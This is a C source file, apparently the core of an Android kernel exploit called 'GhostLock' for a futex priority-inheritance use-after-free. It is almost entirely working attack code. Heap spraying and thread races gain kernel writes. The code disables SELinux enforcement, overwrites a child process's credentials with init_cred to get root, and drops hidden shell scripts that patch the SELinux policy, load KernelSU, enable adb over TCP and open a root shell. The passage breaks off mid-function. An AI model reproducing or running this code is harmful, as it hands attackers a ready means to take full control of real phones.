/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <linux/capability.h>
#include <grp.h>
#include <sys/system_properties.h>

const struct kernel_offsets *active_offsets = NULL;

static void keepalive_block(void);
static void use_self_owner(void);

static void set_image_delta(void) {
  const char *v = getenv("IMAGE_DELTA");
  g_image_delta = (v && *v) ? (intptr_t)strtoll(v, NULL, 0) : 0;
  pr_info("image delta = %#zx\n", (size_t)g_image_delta);
}

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
       * table entry rather than target.h's compile-time constant. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int owner_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* Stack-only carrier: learn this thread's kernel stack base before the
   * route so the fake structures can be placed by the sendmsg frame.  If
   * that fails there is nothing safe to do with mode 7, so abort. */
  if (pselect_custom_write == 7 && !sample_kstack_T()) {
    pr_error("stack carrier: cannot locate kernel stack, aborting\n");
    exit(2);
  }
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  pr_info("waiter requeue_pi returned ret=%ld errno=%d\n", wret, errno);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  keepalive_block();
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  atomic_store(&owner_tid, (int)syscall(SYS_gettid));
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    if (env_flag("TRIGGER_OWNER", 0)) {
      int otid = atomic_load(&owner_tid);
      if (otid > 0) tid = otid;
    }
    pr_info("consumer trigger target tid=%d (waiter=%d owner=%d)\n",
            tid, atomic_load(&waiter_tid), atomic_load(&owner_tid));
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        pr_info("consumer sched_setattr(tid=%d nice=%d) ret=%ld errno=%d\n",
                tid, PSELECT_CONSUMER_NICE, sched_ret, errno);
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&owner_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  long rret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  pr_info("requeue_pi returned ret=%ld errno=%d\n", rret, errno);
  while (!atomic_load(&route_done)) usleep(5000);
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static void fix_selinux_policy(void) {
  static const char fix_script[] =
    "#!/system/bin/sh\n"
    "P=/sys/fs/selinux/policy\n"
    "L=/sys/fs/selinux/load\n"
    "T=/data/local/tmp/.ghostlock_policy.bin\n"
    "cp $P $T 2>/dev/null || exit 1\n"
    "SZ=$(wc -c < $T)\n"
    "[ \"$SZ\" -gt 20 ] || exit 1\n"
    "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "CO=$((4 + 4 + ID_LEN + 4))\n"
    "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "NEW=$(( CFG | 0xC0000000 ))\n"
    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
    "fi\n"
    "cat $T > $L 2>/dev/null\n"
    "rm -f $T\n";
  int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) { pr_info("fix_policy: write script failed errno=%d\n", errno); return; }
  write(sfd, fix_script, strlen(fix_script));
  close(sfd);
  int ret = system("su -c 'sh /data/local/tmp/.ghostlock_fixpol.sh' 2>/dev/null");
  unlink("/data/local/tmp/.ghostlock_fixpol.sh");
  pr_info("fix_policy: script exit=%d\n", ret);
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  const char *script =
    "#!/system/bin/sh\n"
    "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  echo '[+] KernelSU already loaded'\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  echo '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  echo '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  echo '[*] ksud late-load --kmi' $KMI\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >/dev/null 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  echo '[*] ksud pid='$KSUD_PID\n"
    "  for w in $(seq 1 30); do\n"
    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
    "    sleep 1\n"
    "  done\n"
    "  grep -q kernelsu /proc/modules 2>/dev/null && echo '[+] KSU LOADED' || echo '[!] KSU NOT loaded'\n"
    "  grep kernelsu /proc/modules && echo '[+] KSU loaded' || echo '[!] KSU NOT loaded'\n"
    "fi\n"
    "RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -n \"$RSPROP\" ]; then\n"
    "  chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "  ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
    "  \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
    "fi\n"
    "rm -f /data/local/tmp/.ghostlock_w1\n"
    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "  /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "fi\n"
    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "echo '[+] done'\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  write(sfd, script, strlen(script));
  close(sfd);
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  for (;;) pause();
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");

  write_root_script();

  /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
  int selinux_ok = check_selinux_off();
  int umh_available = active_offsets &&
      active_offsets->off_system_unbound_wq &&
      active_offsets->off_ashmem_misc_fops;

  if (!selinux_ok && umh_available) {
    /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
     * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
     * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
    pr_info("UMH path: fops redirect (mode=4)...\n");
    slab_drain();
    TIMER("pre-UMH drain");
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    TIMER("fops redirect done");
    selinux_ok = check_selinux_off();
  }

  if (!selinux_ok && !root_child_done) {
    /* Fallback: direct PI write to selinux_enforcing */
    slab_drain();
    TIMER("pre-W1 drain");
    for (int att = 1; att <= 5 && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/5\n", att);
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    TIMER("Write 1 complete");
  } else if (!selinux_ok && root_child_done) {
    selinux_ok = 1;
  } else {
    pr_success("SELinux off (UMH or already)\n");
  }

  /* Phase 2: Check if UMH root succeeded */
  if (root_child_done) {
    pr_success("UMH root done — skipping W2\n");
    TIMER("exploit complete (UMH)");
    pr_info("waiting for su...\n");
    for (int i = 0; i < 60; i++) {
      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
        pr_success("su ready, fixing SELinux policy\n");
        fix_selinux_policy();
        system("su -c 'setenforce 1' > /dev/null 2>&1");
        pr_success("sepolicy fix done\n");
        break;
      }
      sleep(1);
    }
    return 0;
  }

  /* Phase 2 fallback: Find child task_struct + cred overwrite */
  pr_info("UMH not available, falling back to W2 cred path\n");
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); return 1; }

  uintptr_t child_task = 0;
  read(pipes.task_r, &child_task, sizeof(child_task));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  int got_root = 0;
  for (int round = 1; round <= 10 && !got_root; round++) {
    pr_info("round %d/10: cred write\n", round);
    slab_drain();
    do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
    usleep(50000);
    write(pipes.cmd_w, "C", 1);
    uint32_t child_uid = 9999;
    read(pipes.uid_r, &child_uid, sizeof(child_uid));
    pr_info("child uid = %u\n", child_uid);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  write(pipes.cmd_w, "G", 1);
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }

  sleep(2);
  TIMER("exploit complete");

  pr_info("waiting for su...\n");
  for (int i = 0; i < 60; i++) {
    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
      pr_success("su ready, fixing SELinux policy\n");
      fix_selinux_policy();
      system("su -c 'setenforce 1' > /dev/null 2>&1");
      pr_success("sepolicy fix done\n");
      break;
    }
    sleep(1);
  }

  return 0;
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_port;
extern int mini_adb_shell(const char *cmd);

/* --bootstrap mode: runs from app context (any UID, with seccomp).
 * 1) Write 1 → SELinux off
 * 2) setprop to enable adb TCP on 5555 (SELinux off → property_service allows it)
 * 3) mini-adb connects to 127.0.0.1:5555, authenticates with pre-pushed key,
 *    runs full exploit via adb shell (no app seccomp → perf works)
 */
static int run_bootstrap(void) {
  log_startup_context();

  int ret = run_write1_only();
  if (ret != 0) return ret;

  /* Wait for adb TCP — read the actual port from system property */
  int adb_port = 5555;
  char port_buf[32] = {};
  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
  if (port_buf[0]) adb_port = atoi(port_buf);
  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(adb_port),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP %d after 30s\n", adb_port);
  return 1;
tcp_ready:
  usleep(200000);
  mini_adb_port = adb_port;
  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
  int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
  pr_info("mini-adb returned %d\n", adb_ret);

  return adb_ret;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

static int run_spray_only(void) {
  if (!active_offsets && select_offsets() < 0) return 1;
  set_image_delta();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;
  uintptr_t p = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  pr_info("spray-only result=%#zx\n", (size_t)p);
  return p ? 0 : 1;
}

static int run_zero_probe(void) {
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) {
    pr_error("zero probe mmap failed\n");
    return 1;
  }
  memset(page, 0, 4096);

  uintptr_t guess = 0;
  const char *g = getenv("ZERO_GUESS");
  if (g && *g) {
    guess = (uintptr_t)strtoull(g, NULL, 0);
  }
  uintptr_t target = data_addr(EMPTY_ZERO_PAGE + guess);
  pr_info("zero probe guess=%#zx target=%#zx\n", guess, target);

  if (!do_one_write(target, "ZERO", 1)) {
    return 1;
  }

  uint64_t want = (uint64_t)page_base + 0x100;
  pr_info("zero probe want=%#llx page_base=%#zx\n",
          (unsigned long long)want, (size_t)page_base);

  int hits = 0;
  for (int i = 0; i + 8 <= 4096; i += 8) {
    uint64_t v = *(uint64_t *)(page + i);
    int kptr = v >= 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL;
    if (v == want || kptr) {
